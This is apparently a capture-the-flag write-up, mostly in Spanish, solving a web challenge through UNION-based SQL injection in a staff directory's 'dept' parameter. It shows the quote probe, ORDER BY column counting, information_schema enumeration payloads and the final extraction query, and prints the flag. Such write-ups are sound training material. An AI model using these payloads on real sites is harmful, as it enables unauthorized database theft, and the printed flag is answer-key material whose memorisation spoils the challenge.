# Utopia Smart City - Staff Directory SQL Injection

## Challenge Information

| Field              | Value                                  |
| ------------------ | -------------------------------------- |
| **Challenge Name** | Utopia Smart City - Staff Directory    |
| **Category**       | Web                                    |
| **URL**            | `https://81dc63ec1eef9519.chal.ctf.ae` |
| **Vulnerability**  | SQL Injection (UNION-based)            |
| **Flag**           | `flag{0eed8a58cd71cb4f}`               |

---

## Description

> Explore the staff directory of Utopia Smart City's government departments. Can you find what's hidden in the database?

---

## Reconnaissance

Al acceder a la web, encontramos un **Staff Directory** que permite filtrar empleados por departamento. La aplicación usa el archivo `directory.php` con un parámetro `dept` para realizar la búsqueda.

**URL de búsqueda normal:**

```
https://81dc63ec1eef9519.chal.ctf.ae/directory.php?dept=energy
```

---

## Vulnerability Discovery

### Testing for SQL Injection

Probamos inyectar una comilla simple para detectar errores SQL:

```
https://81dc63ec1eef9519.chal.ctf.ae/directory.php?dept=energy'
```

La página mostró un comportamiento diferente, indicando una posible vulnerabilidad.

### Determining Number of Columns

Usamos `ORDER BY` para determinar el número de columnas en la consulta:

```sql
-- ORDER BY 2 funciona
dept=energy' ORDER BY 2 -- -

-- ORDER BY 3 falla
dept=energy' ORDER BY 3 -- -
```

**Conclusión:** La consulta SQL original usa **2 columnas**.

---

## Exploitation

### Step 1: Enumerate Tables

Listamos las tablas de la base de datos actual usando `information_schema`:

```sql
X' UNION SELECT group_concat(table_name), '2' FROM information_schema.tables WHERE table_schema=database() -- -
```

**Tablas encontradas:**

- `staff`
- `flag` ← ¡Interesante!

### Step 2: Enumerate Columns

Extraemos los nombres de columnas de la tabla `flag`:

```sql
X' UNION SELECT group_concat(column_name), '2' FROM information_schema.columns WHERE table_name='flag' -- -
```

**Columna encontrada:** `flag`

### Step 3: Extract the Flag

Finalmente, extraemos el contenido de la tabla `flag`:

```sql
X' UNION SELECT flag, '2' FROM flag -- -
```

**URL Final:**

```
https://81dc63ec1eef9519.chal.ctf.ae/directory.php?dept=X' UNION SELECT flag, '2' FROM flag -- -
```

---

## Result

La flag apareció en el campo "Name" del Staff Directory:

![Flag Extraction](ctf_flag_confirmation_1769260063662.png)

---

## Flag

```
flag{0eed8a58cd71cb4f}
```

---